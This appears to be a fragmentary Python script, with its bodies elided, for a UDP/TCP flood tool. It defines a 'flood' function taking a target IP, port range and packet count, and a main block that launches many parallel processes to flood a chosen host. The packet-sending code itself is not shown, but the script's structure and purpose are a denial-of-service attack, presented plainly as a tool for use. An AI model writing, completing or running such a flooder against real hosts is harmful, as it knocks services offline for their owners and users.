...
def flood(ip: str, udp: bool, port_from: int, port_to: int, times: int):
...
if __name__ == '__main__':
	...
	parser.add_argument("--threads", help="Threads count", type=int, default=12)

	args = parser.parse_args()

	for _ in range(args.threads):
		Process(target=flood, args=(args.host, not args.tcp, args.port_from, args.port_to, args.packets)).start()
